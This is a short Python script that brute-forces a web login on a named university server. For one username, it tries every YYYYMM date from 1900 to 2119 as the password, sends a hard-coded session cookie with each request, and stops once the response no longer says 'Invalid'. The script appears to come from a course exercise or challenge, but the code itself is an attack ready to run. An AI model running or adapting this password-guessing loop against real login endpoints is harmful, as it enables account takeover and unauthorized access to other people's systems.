#!/usr/bin/env python

import requests, json

url = 'https://cseproj91.cse.iitk.ac.in:5001'
headers = {'Cookie':'_ga=GA1.3.586342836.1515517137',
            'session':'.eJwVzcEKgzAQBNBfKfmCqj0JPRRiisKuCGtD9lhbrGtij2LEf296mLnNvF0t32V4q3JXp6cqFWoz8R1WpqoA26d0ESyLo3FrrSsw1hla9BDYszazo9vWUleADBmKERd4ZkKB4Fag-gyCH0eNoDwmTg2RBXQTWA85iPEur9bW9jnaLsPI83_jqL9gHCMIB7bJi68AhBNon1xIVvqR6qqO4webHD_Q.DbMqMA.NDqII6MFUjcvxVTkuibmUrVTG-U'}

# month = ['1','2','3','4','5','6','7','8','9','10','11','12']
# year = 2018

# while hit == True:
#     hit = False
#     left = -1
# 
for year in range(1900, 2120):
    for month in range(1, 13):
        password = str(year)+str(month).zfill(2)
        print password
        data = {'login':'sagarch',
                'password':password,
                'secret':'sagarch'}
        r = requests.post(url, data = data, headers = headers)
        if r.text[2509:2516] != 'Invalid':
            print "Allah hu Akbar"
            exit()
